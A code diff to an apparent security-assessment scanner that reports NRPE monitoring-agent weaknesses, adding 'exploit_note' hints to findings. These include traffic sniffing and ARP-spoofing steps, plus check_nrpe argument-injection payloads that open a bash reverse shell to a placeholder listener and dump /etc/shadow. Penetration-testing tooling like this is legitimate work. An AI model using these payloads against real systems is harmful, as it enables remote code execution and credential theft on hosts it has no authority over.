@@ -445,11 +445,12 @@ def nrpe_targets(hosts: list[Host]) -> list[dict]:
 
 
 def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
-             cves=None):
+             cves=None, exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "check_nrpe", "command": cmd, "remediation": rem,
             "cwes": list(cwes), "kind": kind,
-            "cves": list(cves or [])}
+            "cves": list(cves or []),
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def _implied_local_services(pr: dict, host: Host) -> list[dict]:
@@ -516,7 +517,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Configure NRPE with use_ssl=1 (v3+) and set allowed_ciphers "
                     "to a non-anonymous list (e.g. ECDHE-RSA-AES256-GCM-SHA384). "
                     "Deploy a real server certificate.",
-                    ["CWE-319"], kind="nrpe_plaintext_traffic"))
+                    ["CWE-319"], kind="nrpe_plaintext_traffic",
+                    exploit_note=(
+                        "tcpdump -i any -w nrpe.pcap 'tcp port 5666'; replay "
+                        "captured queries to correlate with legitimate check "
+                        "output."),
+                    depth_tier="t1"))
                 out.append(_finding(
                     "low", "NRPE v2 packet integrity is CRC32 only", tgt,
                     "The v2 packet checksum is CRC32 — an integrity check, "
@@ -545,7 +551,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "e.g. `allowed_ciphers=ECDHE-RSA-AES256-GCM-SHA384:"
                     "ECDHE-RSA-AES128-GCM-SHA256`. Deploy a real server cert "
                     "and require it on the check_nrpe client.",
-                    ["CWE-295", "CWE-757"], kind="nrpe_anon_dh_tls"))
+                    ["CWE-295", "CWE-757"], kind="nrpe_anon_dh_tls",
+                    exploit_note=(
+                        "openssl s_client -cipher ADH-AES256-SHA -connect "
+                        "<ip>:5666 — confirm; then bettercap arp.spoof + "
+                        "intercept."),
+                    depth_tier="t1"))
 
             if pr.get("tls") and (pr.get("tls_cert_cn") or pr.get("tls_cert_sans")):
                 sans = ", ".join(pr.get("tls_cert_sans") or [])
@@ -572,7 +583,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "Icinga monitoring server IP(s) only. Never use 0.0.0.0/0 "
                 "or a broad CIDR. Consider host-based firewall (nftables/"
                 "iptables) as defense-in-depth.",
-                ["CWE-284", "CWE-1188"], kind="nrpe_allowed_hosts_permissive"))
+                ["CWE-284", "CWE-1188"], kind="nrpe_allowed_hosts_permissive",
+                exploit_note=(
+                    "check_nrpe -H <ip> -p 5666 -c _NRPE_CHECK — then run the "
+                    "CVE-2013-1362 arg-injection probe."),
+                depth_tier="t1"))
 
             present = pr.get("commands_present") or []
             if present:
@@ -687,7 +702,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "substitution — the 2.15 patch is incomplete, see "
                     "CVE-2014-2913).",
                     ["CWE-78", "CWE-88"], kind="nrpe_arg_injection_rce",
-                    cves=["CVE-2013-1362"]))
+                    cves=["CVE-2013-1362"],
+                    exploit_note=(
+                        "check_nrpe -H <ip> -p 5666 -c check_users -a "
+                        "'x$(bash -i >& /dev/tcp/<lhost>/4444 0>&1)y'; also "
+                        "`-a 'x$(cat /etc/shadow)y'` for shadow dump."),
+                    depth_tier="t2"))
 
             if pr.get("metachar_bypass_rce"):
                 out.append(_finding(
@@ -706,7 +726,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "restrictive systemd unit (NoNewPrivileges, ProtectHome, "
                     "ReadOnlyPaths).",
                     ["CWE-78", "CWE-184"], kind="nrpe_metachar_bypass_rce",
-                    cves=["CVE-2014-2913"]))
+                    cves=["CVE-2014-2913"],
+                    exploit_note=(
+                        "check_nrpe -H <ip> -p 5666 -c check_users -a "
+                        "$'x\\n bash -i >& /dev/tcp/<lhost>/4444 0>&1'; grep "
+                        "uid= in reply for confirmation."),
+                    depth_tier="t2"))
     return out
 
 
